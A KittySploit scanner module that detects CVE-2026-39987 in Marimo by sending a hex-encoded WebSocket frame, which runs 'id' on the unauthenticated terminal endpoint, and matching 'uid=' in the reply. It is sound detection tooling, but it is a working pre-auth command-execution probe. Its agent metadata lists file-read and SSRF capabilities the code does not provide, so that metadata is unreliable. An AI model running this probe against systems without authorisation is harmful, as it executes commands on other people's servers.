#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.protocols.websocket.websocket_client import (
    WebsocketTimeoutException,
    Websocket_client,
)

VULN_PATTERN = re.compile(r"uid=\d+\([^)]+\)")

class Module(Scanner, Websocket_client):

    __info__ = {
        "name": "Marimo pre-auth terminal WebSocket RCE detection",
        "description": (
            "Detects potential exposure to CVE-2026-39987 by verifying whether the "
            "Marimo terminal WebSocket endpoint can be reached pre-authentication and "
            "returns command execution output."
        ),
        "author": "ritikchaddha, KittySploit Team",
        "severity": "critical",
        "modules": [],
        "references": [
            "https://github.com/advisories/GHSA-2679-6mx9-h9xc",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-39987",
            "https://github.com/marimo-team/marimo",
        ],
        "cve": "CVE-2026-39987",
        "tags": ["web", "scanner", "marimo", "websocket", "rce", "cve-2026-39987"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    path = OptString("/terminal/ws", "Target WebSocket endpoint path", True)

    def _probe_terminal_socket(self) -> str:
        # Pre-built binary frame observed to trigger an `id` response in vulnerable setups.
        payload = bytes.fromhex("818337fa1e2d5e9e14")
        output = b""

        self.ws_connect()
        self.ws_send(payload, opcode="binary")

        for _ in range(5):
            try:
                chunk = self.ws_recv()
            except WebsocketTimeoutException:
                break

            if not chunk:
                continue
            output += chunk if isinstance(chunk, bytes) else chunk.encode()
            if b"uid=" in output:
                break

        return output.decode(errors="ignore")

    def run(self):
        try:
            output = self._probe_terminal_socket()
            if VULN_PATTERN.search(output):
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-39987",
                    reason="Unauthenticated terminal WebSocket returns command execution output",
                    endpoint=self.path,
                    evidence="uid=... pattern observed in WebSocket response",
                    service="marimo",
                )
                return True
        except Exception:
            return False
        finally:
            self.ws_close()

        return False
